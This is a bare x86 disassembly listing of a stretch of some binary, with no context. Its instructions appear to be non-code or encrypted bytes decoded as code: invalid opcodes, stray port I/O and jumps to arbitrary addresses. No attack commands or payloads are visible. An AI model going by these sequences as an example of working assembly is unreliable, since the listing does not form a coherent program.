  405a74:	mov    BYTE PTR [ecx-0x18a68fe],bh
  405a7a:	dec    edx
  405a7b:	adc    al,0xc
  405a7d:	xchg   edi,eax
  405a7e:	mov    edx,0xc8e31708
  405a83:	stos   BYTE PTR es:[edi],al
  405a84:	sub    BYTE PTR [eax+0x29],bl
  405a87:	jne    0x405a1d
  405a89:	shr    BYTE PTR [edx-0x57],cl
  405a8c:	jae    0x405a7d
  405a8e:	lea    ebx,[esi-0x41]
  405a91:	or     eax,0x6f6314b5
  405a96:	rcl    BYTE PTR [eax-0x764ea4b],1
  405a9c:	shr    BYTE PTR [ecx],0x6f
  405a9f:	pop    edx
  405aa0:	ret    
  405aa1:	push   ebx
  405aa2:	popa   
  405aa3:	in     al,dx
  405aa4:	lods   al,BYTE PTR ds:[esi]
  405aa5:	adc    DWORD PTR [esi],0x54f90639
  405aab:	shl    DWORD PTR [ebx-0x5961f38f],1
  405ab1:	dec    edi
  405ab2:	call   0xf762:0x995ba7b2
  405ab9:	mov    dl,0xff
  405abb:	mov    al,0x87
  405abd:	pop    esi
  405abe:	push   ebp
  405abf:	sbb    DWORD PTR [ecx+0x492cccd],edi
  405ac5:	sbb    al,0xc8
  405ac7:	stos   DWORD PTR es:[edi],eax
  405ac8:	fwait
  405ac9:	mov    ah,0x21
  405acb:	das    
  405acc:	stc    
  405acd:	scas   al,BYTE PTR es:[edi]
  405ace:	pop    ss
  405acf:	xchg   DWORD PTR [edi-0x560d78b8],edx
  405ad5:	cmovg  esi,DWORD PTR [ecx]
  405ad8:	pop    es
  405ad9:	int3   
  405ada:	push   cs
  405adb:	cmp    al,0x66
  405add:	ja     0xfb802a82
  405ae3:	adc    edx,eax
  405ae5:	in     eax,dx
  405ae6:	dec    edx
  405ae7:	inc    esp
  405ae8:	hlt    
  405ae9:	dec    eax
  405aea:	jmp    0x59e:0xdef45850
  405af1:	sbb    al,0x6f
  405af3:	aad    0x69
  405af5:	(bad)  
  405af6:	ror    edx,1
  405af8:	aaa    
  405af9:	mov    esp,0xb076abe2
  405afe:	int    0xf0
  405b00:	iret   
  405b01:	cmp    BYTE PTR [ecx+ecx*1+0x74f51571],bl
  405b08:	rcl    DWORD PTR [ebp+0x4ebf634],1
  405b0e:	shr    BYTE PTR [edi],1
  405b10:	mov    ebx,0x66edd863
  405b15:	and    esi,DWORD PTR [ebp+0x6b923bc]
  405b1b:	lods   eax,DWORD PTR ds:[esi]
  405b1c:	mov    dl,0xf1
  405b1e:	out    dx,eax
  405b1f:	scas   eax,DWORD PTR es:[edi]
  405b20:	imul   DWORD PTR [eax+0x362ff903]
  405b26:	add    ax,0xb3e8
  405b2a:	stos   DWORD PTR es:[edi],eax
  405b2b:	or     edx,DWORD PTR [ecx+0x2d6c4a36]
  405b31:	out    dx,eax
  405b32:	test   al,0x2c
  405b34:	and    dh,0x8d
  405b37:	jae    0x405ba1
  405b39:	(bad)  
  405b3a:	pop    esp
  405b3b:	mov    esi,0xa19424f6
  405b40:	imul   esi,DWORD PTR [eax-0x39cfe475],0x97005539
  405b4a:	lock xchg si,ax
  405b4d:	daa    
  405b4e:	sub    DWORD PTR [ebx-0x7391722d],edx
  405b54:	and    BYTE PTR [ebx+0xe],dl
  405b57:	stos   DWORD PTR es:[edi],eax
  405b58:	and    BYTE PTR [eax+ecx*4],al
  405b5b:	dec    edi
  405b5c:	dec    edi
  405b5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b5e:	hlt    
  405b5f:	pop    edi
  405b60:	push   es
  405b61:	pushf  
  405b62:	sub    DWORD PTR [ebx-0x62d84f7b],ebp
  405b68:	fwait
  405b69:	xor    BYTE PTR [edi],bl
  405b6b:	mov    esp,0x3735d661
  405b70:	inc    ebx
  405b71:	lods   al,BYTE PTR ds:[esi]
  405b72:	ror    edi,cl
  405b74:	mov    gs,WORD PTR [edi]
  405b76:	je     0x405bc9
  405b78:	mov    DWORD PTR [ecx-0x2528b08e],0xa8ac31d2
  405b82:	xchg   edx,eax
  405b83:	ret    0x4976
  405b86:	mov    edi,0x69405d41
  405b8b:	aad    0xb7
  405b8d:	inc    ebx
  405b8e:	push   ebx
  405b8f:	or     DWORD PTR [eax-0x60],ebx
  405b92:	fsub   DWORD PTR [ebx+0x3e54ab92]
  405b98:	fs repnz push ecx
  405b9b:	(bad)  
  405b9c:	in     eax,0xee
  405b9e:	push   esi
  405b9f:	xor    esp,DWORD PTR [eax+0x5301ada]
  405ba5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ba6:	mov    edi,0xadffc6fe
  405bab:	sbb    dh,bl
  405bad:	out    0xfe,al
  405baf:	jbe    0x405c13
  405bb1:	ret    0xe1bc
  405bb4:	hlt    
  405bb5:	repnz dec eax
  405bb7:	jb     0x405bfc
  405bb9:	sbb    bh,BYTE PTR [edx]
  405bbb:	ins    BYTE PTR es:[edi],dx
  405bbc:	xor    BYTE PTR [eax-0x7e],al
  405bbf:	sub    BYTE PTR [edx],0xbd
  405bc2:	pop    ebp
  405bc3:	int3   
  405bc4:	bswap  eax
  405bc6:	out    dx,eax
  405bc7:	dec    esi
  405bc8:	cdq    
  405bc9:	cdq    
  405bca:	push   ss
  405bcb:	imul   ebx,DWORD PTR [edx],0xffffffaa
  405bce:	push   esp
  405bcf:	jb     0x405be7
  405bd1:	cmp    bh,0x5c
  405bd4:	and    BYTE PTR [esp+ebp*4+0x1],dh
  405bd8:	mov    ecx,0x51d165d5
  405bdd:	cmp    al,0x8e
  405bdf:	ins    DWORD PTR es:[edi],dx
  405be0:	and    al,0xa1
  405be2:	dec    eax
  405be3:	push   0x1ce9ade5
  405be8:	jmp    0xe9d0:0x5b788b30
  405bef:	jb     0x405b98
  405bf1:	js     0x405b87
  405bf3:	adc    DWORD PTR [ecx+esi*2-0x207860f2],eax
  405bfa:	mov    ch,0x8a
  405bfc:	icebp  
  405bfd:	inc    edi
  405bfe:	sbb    DWORD PTR [ecx-0x22],ebx
  405c01:	mov    esp,ebx
  405c03:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  405c05:	mov    edi,0x84ce08c6
  405c0a:	mov    ?,WORD PTR [edi]
  405c0c:	and    al,0x91
  405c0e:	pop    esp
  405c0f:	mov    ds:0xf6a545f,al
  405c14:	and    DWORD PTR [ebx],edx
  405c16:	cmc    
  405c17:	rcr    BYTE PTR [edx],1
  405c19:	xchg   ebp,eax
  405c1a:	sub    al,0x32
  405c1c:	push   0xffffffff
  405c1e:	lods   al,BYTE PTR ds:[esi]
  405c1f:	fldcw  WORD PTR [esi+edi*2]
  405c22:	and    DWORD PTR [edx+0x24],0xb
  405c26:	jbe    0x405c73
  405c28:	mov    ds,esp
  405c2a:	mov    ebx,0x86033bda
  405c2f:	scas   eax,DWORD PTR es:[edi]
  405c30:	mov    ebp,0x3a77fce2
  405c35:	pop    ss
  405c36:	leave  
  405c37:	fnsave [ebp-0x6]
  405c3a:	loop   0x405c17
  405c3c:	in     al,dx
  405c3d:	clc    
  405c3e:	neg    DWORD PTR [esi+0x552f8798]
  405c44:	lock div DWORD PTR ds:0x1302c682
  405c4b:	es pushf 
  405c4d:	das    
  405c4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c4f:	(bad)  
  405c50:	rol    BYTE PTR [ecx-0x2c],0xf0
  405c54:	dec    edi
  405c55:	test   ebx,0x7c081882
  405c5b:	push   ss
  405c5c:	jnp    0x405be8
  405c5e:	pop    edi
  405c5f:	mov    edi,0x36ea3f55
  405c64:	outs   dx,BYTE PTR ds:[esi]
  405c65:	sbb    al,0x88
  405c67:	fidivr WORD PTR [edi]
  405c69:	sub    cl,dh
  405c6b:	mov    fs,WORD PTR [edx]
  405c6d:	dec    edi
  405c6e:	xchg   edx,eax
  405c6f:	pop    ebp
  405c70:	int    0xe5
  405c72:	div    BYTE PTR [edx+0x3122cf3]
  405c78:	jecxz  0x405bfa
  405c7a:	(bad)  [esi]
  405c7c:	stc    
  405c7d:	mov    ebp,DWORD PTR [edx]
  405c7f:	(bad)  
  405c80:	xor    al,0x1c
  405c82:	daa    
  405c83:	in     al,0x48
  405c85:	pop    ds
  405c86:	repnz mov ebp,0x78327235
  405c8c:	push   ss
  405c8d:	add    eax,0xdb65c4df
  405c92:	stos   BYTE PTR es:[edi],al
  405c93:	mov    ds:0x87717df2,al
  405c98:	sbb    al,0xa7
  405c9a:	pusha  
  405c9b:	test   BYTE PTR [ebx-0x17],dh
  405c9e:	fwait
  405c9f:	mov    ebp,0x177d9d3d
  405ca4:	jo     0x405cbf
  405ca6:	push   edi
  405ca7:	sub    bh,BYTE PTR [edi+edx*4+0x2b]
  405cab:	adc    esi,DWORD PTR [ebp+0x6c8e150f]
  405cb1:	push   ebx
  405cb2:	add    al,0x0
  405cb4:	mov    dl,0x1a
  405cb6:	mov    BYTE PTR [ebp+0x68],dh
  405cb9:	jmp    0x405ce3
  405cbb:	retf   
  405cbc:	mov    ebx,0x85ea7b2e
  405cc1:	fild   QWORD PTR [esi+0x1a1107d7]
  405cc7:	xchg   edi,edx
  405cc9:	pop    ss
  405cca:	jge    0x405d01
  405ccc:	jb     0x405c71
  405cce:	inc    eax
  405ccf:	dec    esp
  405cd0:	push   es
  405cd1:	mov    bl,0xd9
  405cd3:	mov    esi,0xb9d6009a
  405cd8:	bound  ebp,QWORD PTR [edi+ecx*8-0x59]
  405cdc:	push   esi
  405cdd:	ret    0x1410
  405ce0:	test   eax,edx
  405ce2:	xchg   esp,eax
  405ce3:	leave  
  405ce4:	cld    
  405ce5:	jmp    0x405d18
  405ce7:	repz push cs
  405ce9:	dec    edi
  405cea:	xchg   edx,eax
  405ceb:	mov    esi,0x8b375859
  405cf0:	repz in eax,0x34
  405cf3:	sub    bl,dl
  405cf5:	fwait
  405cf6:	push   0x51802f49
  405cfb:	adc    al,dl
  405cfd:	je     0x405c91
  405cff:	aad    0x33
  405d01:	hlt    
  405d02:	adc    BYTE PTR ds:[edi],bl
  405d05:	jae    0x405cae
  405d07:	cmp    edx,esi
  405d09:	add    DWORD PTR [eax-0x731713b7],edx
  405d0f:	mov    eax,DWORD PTR [ecx]
  405d11:	add    esp,DWORD PTR [esi]
  405d13:	xchg   cl,cl
  405d15:	xchg   edx,eax
  405d16:	xor    BYTE PTR [ebx],ah
  405d18:	std    
  405d19:	sbb    eax,0xd3a2fe8b
  405d1e:	mov    ebp,0x279a50ae
  405d23:	test   eax,0x2523d74d
  405d28:	jne    0x405d5d
  405d2a:	mov    BYTE PTR [ebx+0x23bbbe94],dl
  405d30:	add    dl,BYTE PTR [ecx]
  405d32:	mov    dh,0x45
  405d34:	shr    BYTE PTR [esi-0x52bd406e],cl
  405d3a:	ja     0x405ce9
  405d3c:	std    
  405d3d:	push   esp
  405d3e:	mov    dl,0xf5
  405d40:	xchg   ebx,eax
  405d41:	test   eax,0x8a4e2983
  405d46:	mov    DWORD PTR [edi],edi
  405d48:	iret   
  405d49:	add    eax,0x39204549
  405d4e:	in     eax,0xd4
  405d50:	xor    DWORD PTR [ecx-0x7d],0x75
  405d54:	xchg   ecx,eax
  405d55:	les    edi,FWORD PTR [esi+ecx*2+0x69]
  405d59:	and    al,0xc0
  405d5b:	inc    edi
  405d5c:	pop    eax
  405d5d:	jns    0x405d75
  405d5f:	xor    DWORD PTR [eax+0x21],esp
  405d62:	adc    BYTE PTR [ecx-0xe],ch
  405d65:	dec    esi
  405d66:	sub    bl,BYTE PTR [edi+ebx*2-0x80]
  405d6a:	rcr    BYTE PTR [edi],1
  405d6c:	inc    esp
  405d6d:	jae    0x405d16
  405d6f:	int3   
  405d70:	(bad)  
  405d71:	(bad)  [ecx]
  405d73:	mov    DWORD PTR gs:[edi],esi
  405d76:	mov    dh,0xcb
  405d78:	mov    esp,0x7bc8ffc7
  405d7d:	inc    edx
  405d7e:	jp     0x405d06
  405d80:	call   FWORD PTR [ecx+0x3f893462]
  405d86:	cdq    
  405d87:	dec    ebp
  405d88:	loope  0x405d29
  405d8a:	(bad)  
  405d8b:	shl    DWORD PTR [ebp-0x4d],1
  405d8e:	xchg   esi,ecx
  405d90:	out    0x66,eax
  405d92:	mov    ss,WORD PTR [edx]
  405d94:	mov    dl,0x3a
  405d96:	cmp    ecx,DWORD PTR [edx+0x450ee940]
  405d9c:	push   edi
  405d9d:	enter  0x95fa,0x4e
  405da1:	sub    ebx,DWORD PTR [ebp-0x25bfb6d]
  405da7:	aas    
  405da8:	shl    BYTE PTR [eax],cl
  405daa:	jl     0x405deb
  405dac:	jnp    0x405da7
  405dae:	fild   QWORD PTR [esi+0x183552c5]
  405db4:	adc    DWORD PTR [eax],eax
  405db6:	js     0x405d6c
  405db8:	mov    cl,0xaf
  405dba:	fs xor ch,cl
  405dbd:	or     eax,DWORD PTR [edx+0x2bec9319]
  405dc3:	sub    DWORD PTR [ebp-0x10ad3c3e],esi
  405dc9:	push   ebp
  405dca:	call   0x1de075de
  405dcf:	pop    eax
  405dd0:	mov    DWORD PTR [ecx],edx
  405dd2:	pop    esp
  405dd3:	pop    ebx
  405dd4:	(bad)  
  405dd5:	(bad)  
  405dd6:	fisub  DWORD PTR [ecx+0x6]
  405dd9:	out    0xfd,al
  405ddb:	stos   DWORD PTR es:[edi],eax
  405ddc:	repz xor al,0x2
  405ddf:	mov    ds:0x7ce13c0d,eax
  405de4:	(bad)  
  405de5:	cmc    
  405de6:	jnp    0x405da4
  405de8:	pop    es
  405de9:	stos   BYTE PTR es:[edi],al
  405dea:	bound  edx,QWORD PTR [eax-0x15]
  405ded:	cmp    al,0x57
  405def:	pop    ss
  405df0:	int3   
  405df1:	and    esp,esi
  405df3:	scas   eax,DWORD PTR es:[edi]
  405df4:	sahf   
  405df5:	mov    edi,0xc1c65629
  405dfa:	jae    0x405db5
  405dfc:	and    dh,al
  405dfe:	in     al,0x5b
  405e00:	fwait
  405e01:	popf   
  405e02:	cmp    DWORD PTR [edi+edx*2+0x40ffdf9c],esi
  405e09:	jmp    0x22b:0xe19d5813
  405e10:	adc    al,0x49
  405e12:	jg     0x405e73
  405e14:	out    0x5,eax
  405e16:	loope  0x405de1
  405e18:	sub    DWORD PTR [eax-0x5acb7d5c],ebp
  405e1e:	xchg   ebx,eax
  405e1f:	xor    al,0xab
  405e21:	xor    al,0xd
  405e23:	sbb    ebp,DWORD PTR [ecx]
  405e25:	sbb    eax,0x1749f27c
  405e2a:	push   ds
  405e2b:	sub    BYTE PTR [esi+ebp*8],dh
  405e2e:	or     ecx,DWORD PTR [edi]
  405e30:	loope  0x405e93
  405e32:	ficom  WORD PTR [edx-0x729739c3]
  405e38:	sbb    ch,BYTE PTR [eax-0x26]
  405e3b:	push   0xffffffa0
  405e3d:	cld    
  405e3e:	jl     0x405e55
  405e40:	mov    ebx,0xdcbc9cc4
  405e45:	sub    edi,DWORD PTR [edi+0x364616e7]
  405e4b:	sar    DWORD PTR [edx-0x3],1
  405e4e:	mov    cl,0x9e
  405e50:	in     al,0xd0
  405e52:	mov    dl,BYTE PTR [edi+0x13afb660]
  405e58:	jmp    0xc8f3:0xa82273f1
  405e5f:	adc    al,0xe3
  405e61:	or     bh,BYTE PTR [eax]
  405e63:	pop    edi
  405e64:	aaa    
  405e65:	in     eax,dx
  405e66:	inc    esp
  405e67:	xchg   DWORD PTR [edi+0x56b18931],ebp
  405e6d:	outs   dx,DWORD PTR ds:[esi]
  405e6e:	or     eax,edi
  405e70:	pop    ecx
  405e71:	lds    esp,FWORD PTR [esi-0x36]
  405e74:	not    al
  405e76:	xor    cl,BYTE PTR [ebp+0x60]
  405e79:	xor    al,0x74
  405e7b:	dec    esi
  405e7c:	jno    0x405efb
  405e7e:	mov    BYTE PTR [ebx],ah
  405e80:	repnz dec esi
  405e82:	jbe    0x405e5b
  405e84:	mov    esp,0x85d58365
  405e89:	movzx  ebx,bl
  405e8c:	fwait
  405e8d:	test   dl,0x5
  405e90:	sbb    BYTE PTR [edx-0x6ad6aac3],dh
  405e96:	sub    eax,0xb3571d68
  405e9b:	test   al,0xa1
  405e9d:	out    0x40,al
  405e9f:	bound  edx,QWORD PTR [edx+esi*1]
  405ea2:	or     al,0xf3
  405ea4:	sub    BYTE PTR [ecx],bh
  405ea6:	push   ebx
  405ea7:	mov    cl,0x79
  405ea9:	ret    0xd7fe
  405eac:	xchg   esp,eax
  405ead:	(bad)  
  405eae:	xchg   edx,eax
  405eaf:	fwait
  405eb0:	aas    
  405eb1:	push   eax
  405eb2:	pushf  
  405eb3:	mov    dh,0x6
  405eb5:	mov    DWORD PTR [eax+0x72],edx
  405eb8:	aaa    
  405eb9:	inc    edx
  405eba:	and    DWORD PTR [edx-0x3f852060],ecx
  405ec0:	rcr    BYTE PTR [ebx-0x45],cl
  405ec3:	mov    al,ds:0x48e019fd
  405ec8:	xchg   ebx,eax
  405ec9:	or     cl,ah
  405ecb:	call   0x686d6016
  405ed0:	call   0x36bf6fd4
  405ed5:	xor    al,0x53
  405ed7:	xchg   ecx,eax
  405ed8:	inc    esp
  405ed9:	test   DWORD PTR ds:0x2b1f1184,edx
  405edf:	mov    ebp,0xbd622761
  405ee4:	enter  0xcd2,0xe5
  405ee8:	pop    edx
  405ee9:	ds stos BYTE PTR es:[edi],al
  405eeb:	int    0xf4
  405eed:	push   ebx
  405eee:	adc    al,0xba
  405ef0:	in     eax,dx
  405ef1:	and    al,0xef
  405ef3:	push   0xffffff99
  405ef5:	mov    al,ds:0x5d25bdb6
  405efa:	test   al,0x84
  405efc:	icebp  
  405efd:	cmp    eax,0xdfd5a823
  405f02:	mov    ds:0x8f815f2b,al
  405f07:	mov    dl,0x2f
  405f09:	pop    ecx
  405f0a:	fcomp  DWORD PTR [esi+0x78c018d]
  405f10:	add    eax,0xaddd0fdc
  405f15:	cwde   
  405f16:	mov    cl,0x68
  405f18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f19:	int    0x0
  405f1b:	jae    0x405eb0
  405f1d:	cmp    esp,0xffffff94
  405f20:	int3   
  405f21:	push   esi
  405f22:	sub    al,0x9f
  405f24:	xlat   BYTE PTR ds:[ebx]
  405f25:	jmp    0x405fa1
  405f27:	aam    0x75
  405f29:	iret   
  405f2a:	test   BYTE PTR [edi+0x5b869509],0x1f
  405f31:	clc    
  405f32:	pop    es
  405f33:	ins    DWORD PTR es:[edi],dx
  405f34:	adc    esp,0x177d405c
  405f3a:	mov    ah,0x23
  405f3c:	xlat   BYTE PTR ds:[ebx]
  405f3d:	and    DWORD PTR [eax],ebx
  405f3f:	cmp    dl,al
  405f41:	(bad)  
  405f42:	cmp    eax,0xf61c9305
  405f47:	xor    esi,DWORD PTR [edx-0x6dab05fe]
  405f4d:	das    
  405f4e:	mov    bl,0xca
  405f50:	xor    DWORD PTR [edx],0x40
  405f53:	mov    DWORD PTR [eax-0x70d8251b],eax
  405f59:	in     al,0x32
  405f5b:	sbb    al,0x24
  405f5d:	xor    dh,bl
  405f5f:	jl     0x405f46
  405f61:	cdq    
  405f62:	jo     0x405f02
  405f64:	int    0x5d
  405f66:	pop    ds
  405f67:	mov    ah,0x31
  405f69:	mov    dh,0x29
  405f6b:	out    0xc2,al
  405f6d:	lods   al,BYTE PTR ds:[esi]
  405f6e:	push   ecx
  405f6f:	dec    ebp
  405f70:	test   cl,cl
  405f72:	aaa    
  405f73:	mov    dh,0x84
  405f75:	imul   eax,esi,0xd4ffed3
  405f7b:	push   es
  405f7c:	push   ss
  405f7d:	sbb    cx,WORD PTR [edi-0x1d]
  405f81:	jne    0x405f25
  405f83:	fdiv   st,st(3)
  405f85:	outs   dx,BYTE PTR ds:[esi]
  405f86:	add    al,0x60
  405f88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f89:	lea    ebx,[eax+ecx*4]
  405f8c:	pop    ds
  405f8d:	imul   esp,ebx,0x411ceaf6
  405f93:	cmp    al,0x57
  405f95:	ins    DWORD PTR es:[edi],dx
  405f96:	(bad)  
  405f97:	ins    BYTE PTR es:[edi],dx
  405f98:	xor    DWORD PTR [edi-0x1fe62666],esi
  405f9e:	test   eax,0x42dc6d25
  405fa3:	inc    ebp
  405fa4:	xor    eax,0x17ac7d56
  405fa9:	shl    edi,cl
  405fab:	fdiv   st(2),st
  405fad:	inc    esp
  405fae:	into   
  405faf:	pop    ss
  405fb0:	xchg   ebp,eax
  405fb1:	aas    
  405fb2:	xchg   esp,eax
  405fb3:	xchg   edx,eax
  405fb4:	out    dx,eax
  405fb5:	push   ds
  405fb6:	bound  eax,QWORD PTR [edi+edi*8+0x700931f3]
  405fbd:	xchg   DWORD PTR [ebp-0x1c],edi
  405fc0:	das    
  405fc1:	cdq    
  405fc2:	ret    0x4a20
  405fc5:	dec    esi
  405fc6:	mov    dh,0xe6
  405fc8:	push   eax
  405fc9:	pop    edx
  405fca:	imul   DWORD PTR [esi]
  405fcc:	sub    DWORD PTR [ecx+0x33],edi
  405fcf:	int    0xbc
  405fd1:	and    DWORD PTR [edx+0x60e112dc],ebx
  405fd7:	mov    ebp,0x50c1c2d7
  405fdc:	mov    DWORD PTR [ebx-0x7],esp
  405fdf:	(bad)  
  405fe0:	jg     0x405fac
  405fe2:	or     DWORD PTR [edx-0x6c],0x42308d09
  405fe9:	add    eax,0x4496763b
  405fee:	leave  
  405fef:	push   cs
  405ff0:	jmp    0x405fca
  405ff2:	cmp    ch,BYTE PTR [esp+esi*4-0x1e]
  405ff6:	cmp    BYTE PTR [edx],0xb4
  405ff9:	push   0xfb32aaa1
  405ffe:	cmp    eax,0x93914b6d
  406003:	les    ebp,FWORD PTR [edx]
  406005:	outs   dx,BYTE PTR ds:[esi]
  406006:	loope  0x40600e
  406008:	rcl    BYTE PTR [esi+0x6e],cl
  40600b:	sbb    eax,0x4a5b5b00
  406010:	or     BYTE PTR [eax],bl
  406012:	mov    al,0xe4
  406014:	shl    BYTE PTR [edx],0xa2
  406017:	lds    edx,FWORD PTR [ecx-0x52159ea3]
  40601d:	dec    esp
  40601e:	jmp    0x3d2d:0xe426e88e
  406025:	jge    0x406014
  406027:	les    edx,FWORD PTR [ebx]
  406029:	in     al,0x7f
  40602b:	outs   dx,DWORD PTR ds:[esi]
  40602c:	push   ecx
  40602d:	push   esp
  40602e:	stos   BYTE PTR es:[edi],al
  40602f:	pop    es
  406030:	inc    ebp
  406031:	pop    ebx
  406032:	xor    ecx,DWORD PTR [eax-0x5b585172]
  406038:	dec    ecx
  406039:	xchg   esi,eax
  40603a:	or     al,0xb1
  40603c:	mov    bh,0x11
  40603e:	repnz pusha 
  406040:	in     eax,0x70
  406042:	cdq    
  406043:	and    ah,bh
  406045:	das    
  406046:	jne    0x40604b
  406048:	jle    0x405fe0
  40604a:	inc    ebx
  40604b:	ror    DWORD PTR [ecx+0x36],1
  40604e:	fs pop esp
  406050:	stos   BYTE PTR es:[edi],al
  406051:	ins    BYTE PTR es:[edi],dx
  406052:	ja     0x406017
  406054:	shl    DWORD PTR [edi+0x3a0177bc],0x92
  40605b:	inc    edx
  40605c:	out    0xca,al
  40605e:	add    al,0x41
  406060:	(bad)  
  406061:	popf   
  406062:	xchg   ebx,eax
  406063:	mov    bl,0x19
  406065:	js     0x40601d
  406067:	push   ds
  406068:	xor    dl,BYTE PTR [edi-0x3]
  40606b:	mov    esi,0xe92f4366
  406070:	test   BYTE PTR [edx-0x1e70fc06],ah
  406076:	aam    0x78
  406078:	loop   0x406042
  40607a:	mov    DWORD PTR [edi+ebx*1+0x7f870d6f],edi
  406081:	push   ss
  406082:	lods   al,BYTE PTR ds:[esi]
  406083:	iret   
  406084:	or     eax,0x632f3224
  406089:	out    dx,eax
  40608a:	es push ebx
  40608c:	xchg   ebp,eax
  40608d:	inc    esp
  40608e:	cdq    
  40608f:	or     BYTE PTR [ecx+esi*1-0x28],dl
  406093:	jl     0x406043
  406095:	es daa 
  406097:	jbe    0x4060f7
  406099:	push   0xbd26100a
  40609e:	push   es
  40609f:	pop    esp
  4060a0:	or     eax,0xf8d6b689
  4060a5:	mov    cl,BYTE PTR [eax+0x7c]
  4060a8:	push   cs
  4060a9:	dec    ecx
  4060aa:	neg    BYTE PTR [edx+eax*1+0x73]
  4060ae:	and    eax,DWORD PTR [esi]
  4060b0:	push   ebx
  4060b1:	or     eax,0xe737d27d
  4060b6:	inc    ebp
  4060b7:	icebp  
  4060b8:	loop   0x4060e0
  4060ba:	fstp   DWORD PTR [ebx+0x15]
  4060bd:	int    0xfa
  4060bf:	popf   
  4060c0:	in     eax,0x1f
  4060c2:	fdivr  QWORD PTR [edi+0x2d]
  4060c5:	jb     0x406065
  4060c7:	(bad)  
  4060c8:	mov    ebp,0x8bbb8ae
  4060cd:	pop    esi
  4060ce:	push   es
  4060cf:	cld    
  4060d0:	outs   dx,BYTE PTR ds:[esi]
  4060d1:	inc    esi
  4060d2:	jp     0x40607e
  4060d4:	clc    
  4060d5:	sub    BYTE PTR [ebx+0x7c],ah
  4060d8:	ror    DWORD PTR [edx+edx*4],1
  4060db:	cmc    
  4060dc:	sub    al,0xbb
  4060de:	mov    edi,0x7ba87af1
  4060e3:	fidivr WORD PTR [edi+0x7eb6a4fd]
  4060e9:	cmc    
  4060ea:	shl    BYTE PTR fs:[edx-0x1],0xb1
  4060ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060f0:	push   es
  4060f1:	nop
  4060f2:	sub    bh,BYTE PTR [eax]
  4060f4:	pop    edi
  4060f5:	pushf  
  4060f6:	push   eax
  4060f7:	mov    eax,DWORD PTR [edx+0x2d404618]
  4060fd:	popa   
  4060fe:	mov    eax,ds:0x5ac524e1
  406103:	or     cl,BYTE PTR [ebx-0x71a43b43]
  406109:	mov    edi,DWORD PTR [edi-0x306c252e]
  40610f:	cdq    
  406110:	mov    ds:0x3b60301a,eax
  406116:	int    0x50
  406118:	mov    esi,0x93164c60
  40611d:	dec    ebp
  40611e:	stos   BYTE PTR es:[edi],al
  40611f:	xor    al,0x1e
  406121:	sub    BYTE PTR [ecx+0x5a309bd0],0xaa
  406128:	or     BYTE PTR [ecx],bl
  40612a:	mov    esi,0x37c9b55d
  40612f:	(bad)  
  406130:	sub    BYTE PTR [edi+0xd],dh
  406133:	out    dx,al
  406134:	and    al,0xbf
  406136:	jbe    0x4060c4
  406138:	mov    ebp,0x1563956f
  40613d:	jmp    0x5198:0xc0d6667c
  406144:	(bad)  
  406145:	inc    ebx
  406146:	ins    DWORD PTR es:[edi],dx
  406147:	and    al,0x40
  406149:	cs jne 0x406135
  40614c:	and    bh,BYTE PTR [ebx-0x25]
  40614f:	add    BYTE PTR [edx+0x23eed6f0],dl
  406155:	stc    
  406156:	dec    ebx
  406157:	dec    edx
  406158:	jnp    0x40616f
  40615a:	adc    BYTE PTR [eax+0x7ccc4060],cl
  406160:	ds adc DWORD PTR gs:[di+0xe],ebp
  406166:	sub    eax,0xec4c6cd1
  40616b:	mov    ecx,0xfebee1d5
  406170:	jle    0x406122
  406172:	fst    QWORD PTR [ecx+ebx*8+0xd]
  406176:	cli    
  406177:	stc    
  406178:	inc    edx
  406179:	cs inc ecx
  40617b:	call   0x9589f343
  406180:	retf   0xe7ca
  406183:	push   es
  406184:	(bad)  
  406185:	out    dx,eax
  406186:	pop    eax
  406187:	jp     0x40612c
  406189:	ret    
  40618a:	xor    al,BYTE PTR [eax+0x7cecbcbf]
  406190:	inc    ebx
  406191:	fistp  WORD PTR [ebx+0x5eb72954]
  406197:	test   al,0x2a
  406199:	test   BYTE PTR [ebx+0x6f],0x5a
  40619d:	jmp    0x4d5bdb80
  4061a2:	ins    BYTE PTR es:[edi],dx
  4061a3:	inc    esi
  4061a4:	and    ebp,0x29
  4061a7:	xor    eax,0xf406676d
  4061ac:	adc    ecx,ecx
  4061ae:	fxch   st(0)
  4061b0:	(bad)  
  4061b1:	into   
  4061b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061b3:	rcl    BYTE PTR ds:0x71751387,1
  4061b9:	mov    bl,0x90
  4061bb:	cmp    cl,BYTE PTR [edx-0x30]
  4061be:	push   esi
  4061bf:	jmp    0xde3f844f
  4061c4:	(bad)  
  4061c5:	ror    eax,cl
  4061c7:	sbb    DWORD PTR [edi-0x95bd4d0],0xffffffcf
  4061ce:	mov    al,0x2b
  4061d0:	xor    edx,DWORD PTR [ebx+0x675d8e51]
  4061d6:	mov    edx,0x141a40de
  4061db:	shl    BYTE PTR [edi+ebp*2-0x7b346854],0xa8
  4061e3:	push   ebx
  4061e4:	xchg   edx,eax
  4061e5:	mov    eax,0xfb41a217
  4061ea:	repz sub BYTE PTR [eax-0x64],dh
  4061ee:	mov    esi,0xe44988a0
  4061f3:	outs   dx,BYTE PTR ds:[esi]
  4061f4:	ror    DWORD PTR ss:[ecx-0x73],0x51
  4061f9:	xchg   edi,eax
  4061fa:	cmp    ecx,0xeaf63246
  406200:	fwait
  406201:	mov    ebp,0xa24e83ac
  406206:	sbb    BYTE PTR [ecx+0x51c2a7d5],dl
  40620c:	xchg   ebp,eax
  40620d:	test   BYTE PTR [ebx+0x55],0xf0
  406211:	pop    ecx
  406212:	xchg   edi,eax
  406213:	xchg   esp,eax
  406214:	cmp    al,0x44
  406216:	sbb    DWORD PTR [esi],edx
  406218:	cmc    
  406219:	fistp  QWORD PTR [esi]
  40621b:	(bad)  
  40621c:	(bad)  
  40621d:	js     0x406237
  40621f:	pop    ebp
  406220:	cli    
  406221:	add    esp,DWORD PTR ss:[ecx+0x32]
  406225:	pop    ss
  406226:	push   ds
  406227:	ins    DWORD PTR es:[edi],dx
  406228:	add    eax,0x3a38079a
  40622d:	inc    ebp
  40622e:	mov    edi,0xcf83b8ff
  406233:	in     eax,dx
  406234:	cli    
  406235:	mov    ecx,0x23e85f0e
